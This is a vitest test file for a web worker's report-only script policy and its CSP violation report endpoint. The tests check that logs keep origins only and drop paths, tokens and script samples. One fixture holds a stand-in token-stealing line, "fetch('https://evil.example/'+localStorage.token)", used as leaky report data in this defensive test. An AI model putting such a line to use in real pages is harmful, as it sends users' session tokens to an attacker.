/**
 * The report-only script policy reaches every app document, and its reports
 * come back to a log that keeps origins only: never a note's path, a token in
 * a query, or the script text a browser may attach.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import worker from "./index";
import { CSP_REPORT_PATH, parseCspReport, SCRIPT_POLICY } from "./cspReport";

const CTX = { waitUntil: (promise: Promise<unknown>) => void promise, passThroughOnException: () => {} } as unknown as ExecutionContext;
const assets = vi.fn(() => new Response("<!doctype html>", { headers: { "Content-Type": "text/html" } }));
const ENV = { CONVEX_ORIGIN: "https://example-deployment.convex.site", ASSETS: { fetch: assets } as unknown as Fetcher };

let logs: string[];
beforeEach(() => {
  logs = [];
  vi.stubGlobal("fetch", vi.fn(() => new Response("upstream")));
  vi.spyOn(console, "log").mockImplementation((line: string) => void logs.push(line));
});
afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

function report(body: unknown, init: RequestInit = {}): Promise<Response> {
  const request = new Request(`https://context.lc${CSP_REPORT_PATH}`, {
    method: "POST",
    headers: { "Content-Type": "application/csp-report" },
    body: JSON.stringify(body),
    ...init,
  });
  return worker.fetch(request, ENV, CTX) as Promise<Response>;
}

const LEAKY = {
  "document-uri": "https://context.lc/note/@acme/projects/secret-merger.md?token=abc123",
  "blocked-uri": "https://evil.example/steal.js?t=abc123",
  "effective-directive": "script-src-elem",
  "script-sample": "fetch('https://evil.example/'+localStorage.token)",
};

describe("the policy", () => {
  it("is report-only on the app document and names the report path", async () => {
    const response = await worker.fetch(new Request("https://context.lc/console"), ENV, CTX);
    expect(response.headers.get("Content-Security-Policy-Report-Only")).toBe(SCRIPT_POLICY);
    expect(SCRIPT_POLICY).toContain(`report-uri ${CSP_REPORT_PATH}`);
    expect(SCRIPT_POLICY).toContain("object-src 'none'");
    // Enforcing CSP still only says who may frame; scripts are not blocked yet.
    expect(response.headers.get("Content-Security-Policy")).toBe("frame-ancestors 'self'");
  });

  it("allows no host it does not need", () => {
    const hosts = SCRIPT_POLICY.match(/https:\/\/[^\s;]+/g) ?? [];
    expect(hosts).toEqual(["https://challenges.cloudflare.com"]);
    expect(SCRIPT_POLICY).not.toMatch(/'unsafe-inline'|'unsafe-eval'|\*/);
  });
});

describe("the report endpoint", () => {
  it("logs the directive and origins, and nothing else from the report", async () => {
    const response = await report({ "csp-report": LEAKY });
    expect(response.status).toBe(204);
    expect(await response.text()).toBe("");
    expect(logs).toHaveLength(1);
    expect(JSON.parse(logs[0])).toEqual({
      event: "csp_report_only_violation",
      directive: "script-src-elem",
      blocked: "https://evil.example",
      page: "https://context.lc",
    });
    expect(logs[0]).not.toMatch(/secret-merger|abc123|localStorage|steal/);
  });

  it("reads the Reporting API's array shape", () => {
    expect(
      parseCspReport(JSON.stringify([{ type: "csp-violation", body: { documentURL: LEAKY["document-uri"], blockedURL: "inline", effectiveDirective: "script-src-elem" } }, { type: "deprecation", body: {} }])),
    ).toEqual([{ directive: "script-src-elem", blocked: "inline", page: "https://context.lc" }]);
  });

  it("never logs a directive or keyword it does not recognise verbatim", () => {
    const [violation] = parseCspReport(JSON.stringify({ "csp-report": { "effective-directive": "x; secret note text", "blocked-uri": "notes about the merger" } }));
    expect(violation).toEqual({ directive: "unknown", blocked: "unparsed", page: "none" });
  });

  it("answers anything that is not a POST with 405, and logs nothing", async () => {
    const response = await worker.fetch(new Request(`https://context.lc${CSP_REPORT_PATH}`), ENV, CTX);
    expect(response.status).toBe(405);
    expect(logs).toEqual([]);
    expect(assets).not.toHaveBeenCalledWith(expect.objectContaining({ url: expect.stringContaining(CSP_REPORT_PATH) }));
  });

  it("refuses an oversized body without reading it", async () => {
    const response = await report({ "csp-report": LEAKY }, { headers: { "Content-Length": String(1024 * 1024) } });
    expect(response.status).toBe(413);
    expect(logs).toEqual([]);
  });

  it("treats junk as no violations", async () => {
    const response = await worker.fetch(new Request(`https://context.lc${CSP_REPORT_PATH}`, { method: "POST", body: "not json" }), ENV, CTX);
    expect(response.status).toBe(204);
    expect(logs).toEqual([]);
  });
});
